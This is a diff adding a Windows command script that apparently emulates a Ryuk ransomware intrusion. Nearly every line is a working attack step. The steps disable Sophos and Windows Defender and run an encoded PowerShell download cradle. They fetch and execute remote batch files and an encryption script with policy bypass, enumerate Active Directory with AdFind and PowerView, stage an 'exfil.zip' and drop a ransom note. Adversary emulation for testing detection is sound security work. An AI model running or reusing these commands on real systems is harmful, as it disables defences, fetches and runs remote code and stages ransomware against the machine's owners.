@@ -1,0 +1,72 @@
+####Deshabilitar sophos
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SAVService" /t REG_DWORD /v Start /d 0x00000004 /f 
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Sophos\SAVService\TamperProtection" /t REG_DWORD /v Enabled /d 0 /f
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sophos MCS Agent" /t REG_DWORD /v Start /d 0x00000004 /f 
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sophos Endpoint Defense\TamperProtection\Config" /t REG_DWORD /v SEDEnabled /d 0 /f 
+REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sophos Endpoint Defense\TamperProtection\Config" /t REG_DWORD /v SAVEnabled /d 0 /f
+C:\Program Files\Sophos\Sophos Endpoint Agent\SophosUninstall.exe --quiet
+
+
+cmd /c mkdir %USERPROFILE%\Desktop\ryuk
+cmd /c mkdir %USERPROFILE%\Desktop\ryuk\ryuk_adf
+powershell Invoke-WebRequest -Uri https://github.com/BinaryDefense/community-threats/blob/master/Ryuk/VFS/taskkill.bat -OutFile %USERPROFILE%\Desktop\ryuk\taskkill.bat
+#powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/netxoo/Bateria/master/taskkill.bat -OutFile "$env:userprofile\Desktop\ryuk\taskkill.bat"
+cmd /c "start %USERPROFILE%\Desktop\ryuk\taskkill.bat"
+cmd /c SCHTASKS /CREATE /SC DAILY /TN "MyTasks Example Task" /TR "C:\Windows\System32\calc.exe" /ST 11:00 /F
+cmd /c SCHTASKS /QUERY /TN "MyTasks Example Task"
+cmd /c SCHTASKS /RUN /TN "MyTasks Example Task"
+powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA3ADgAMAAxAC8AJwApADsAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA==
+powershell Set-MpPreference -DisableRealtimeMonitoring $false
+cmd /c "sc config WinDefend start= disabled"
+#Set-MpPreference -DisableRealtimeMonitoring $false
+cmd /c REG ADD HKEY_CURRENT_USER\Software\ExampleRegKey /v Example /d "Example Data" /f
+cmd /c REG QUERY HKEY_CURRENT_USER\Software\ExampleRegKey
+cmd /c tasklist
+powershell Invoke-WebRequest -Uri https://github.com/BinaryDefense/community-threats/blob/master/Ryuk/VFS/adf.bat -OutFile %USERPROFILE%\Desktop\ryuk\ryuk_adf\adf.bat
+#powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/BinaryDefense/community-threats/master/Ryuk/VFS/adf.bat -OutFile "$env:userprofile\Desktop\ryuk\adf.bat"
+powershell Invoke-WebRequest -Uri https://www.joeware.net/downloads/files/AdFind.zip -OutFile %USERPROFILE%\Desktop\ryuk\ryuk_adf\AdFind.zip
+#powershell Invoke-WebRequest -Uri https://www.joeware.net/downloads/files/AdFind.zip -OutFile "$env:userprofile\Desktop\ryuk\AdFind.zip"
+cmd /c powershell -Command Expand-Archive "%USERPROFILE%\Desktop\ryuk\AdFind.zip" -DestinationPath "%USERPROFILE%\Desktop\ryuk"
+cmd /c "net view /all"
+cmd /c "net view /all /domain"
+cmd /c nltest /domain_trusts > "$env:userprofile\Desktop\ryuk\ryuk_adf\ad_trustdmp.txt"
+cmd /c net group "Domain Admins" /do
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\ad_trustdmp.txt
+cmd /c net group "Enterprise Admins" /domain
+cmd /c "start %USERPROFILE%\Desktop\ryuk\adf.bat"
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\ad_users.txt
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\ad_computers.txt
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\trustdump.txt
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\subnets.txt
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\domainlist.txt
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\dcmodes.txt
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\adinfo.txt
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\dclist.txt
+cmd /c type %USERPROFILE%\Desktop\ryuk\ryuk_adf\computers_pwdnotreqd.txt
+powershell "Compress-Archive %USERPROFILE%\Desktop\ryuk\ryuk_adf %USERPROFILE%\Desktop\ryuk\ryuk_adf.zip"
+#powershell Compress-Archive "$env:userprofile\Desktop\ryuk\ryuk_adf"  "$env:userprofile\Desktop\ryuk\ryuk_adf.zip"
+cmd /c systeminfo
+powershell Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+cmd /c nltest /dclist:
+Invoke-WebRequest -Uri https://github.com/BinaryDefense/community-threats/blob/master/Ryuk/VFS/PowerView.ps1 -OutFile %USERPROFILE%\Desktop\ryuk\ryuk_adf\PowerView.ps1
+#Invoke-WebRequest -Uri https://raw.githubusercontent.com/BinaryDefense/community-threats/master/Ryuk/VFS/PowerView.ps1 -OutFile "$env:userprofile\Desktop\ryuk\PowerView.ps1"
+powershell.exe -exec bypass -Command "&{Import-Module %USERPROFILE%\Desktop\ryuk\PowerView.ps1;Get-NetSubnet}"
+powershell.exe -exec bypass -Command "&{Import-Module %USERPROFILE%\Desktop\ryuk\PowerView.ps1;Get-NetComputer}"
+powershell.exe -exec bypass -Command "&{Import-Module %USERPROFILE%\Desktop\ryuk\PowerView.ps1;Invoke-CheckLocalAdminAccess}"
+powershell.exe -exec bypass -Command "&{Import-Module %USERPROFILE%\Desktop\ryuk\PowerView.ps1;Find-LocalAdminAccess}"
+cmd /c mkdir "%USERPROFILE%\Desktop\ryuk\ryuk_target_files"
+fsutil file createnew %USERPROFILE%\Desktop\ryuk\ryuk_target_files\target_file.xls 50000
+#fsutil file createnew $env:userprofile\Desktop\ryuk\ryuk_target_files\target_file.xls 50000
+powershell Compress-Archive -Path $env:userprofile\Desktop\ryuk\ryuk_target_files -CompressionLevel Optimal -Destination $env:userprofile\Desktop\ryuk\exfil.zip
+
+powershell Invoke-WebRequest -Uri https://github.com/netxoo/Bateria/blob/master/encrypt_rk.ps1 -OutFile $env:userprofile\Desktop\ryuk\encrypt_rk.ps1
+#powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/netxoo/Bateria/master/encrypt_rk.ps1 -OutFile $env:userprofile\Desktop\ryuk\encrypt_rk.ps1
+powershell -exec bypass %USERPROFILE%\Desktop\ryuk\encrypt_rk.ps1
+#powershell -exec bypass $env:userprofile\Desktop\ryuk\encrypt_rk.ps1
+
+Invoke-WebRequest -Uri https://github.com/BinaryDefense/community-threats/blob/master/Ryuk/VFS/RyukReadMe.txt -OutFile %USERPROFILE%\Desktop\ryuk\ryuk_adf\RyukReadMe.txt
+#Invoke-WebRequest -Uri https://raw.githubusercontent.com/BinaryDefense/community-threats/master/Ryuk/VFS/RyukReadMe.txt -OutFile $env:userprofile\Desktop\RyukReadMe.txt
+
+cmd /c REG DELETE HKEY_CURRENT_USER\Software\ExampleRegKey /f
+cmd /c SCHTASKS /DELETE /TN "MyTasks\Example Task" /F
+cmd /c rmdir /Q /S "%USERPROFILE%\Desktop\ryuk"
